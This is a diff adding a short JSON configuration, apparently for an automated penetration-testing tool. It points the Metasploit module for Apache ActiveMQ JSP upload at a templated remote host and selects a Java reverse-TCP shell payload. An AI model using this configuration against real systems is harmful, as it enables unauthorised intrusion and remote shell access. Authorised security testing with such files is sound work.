@@ -1,0 +1,8 @@
+{
+"name": "activemq",
+"remote_host": "{{.RHOST}}",
+"target_uri": "/",
+"exploit": "exploit/multi/http/apache_activemq_upload_jsp",
+"payload": "java/shell/reverse_tcp",
+"reverse_shell": true
+}
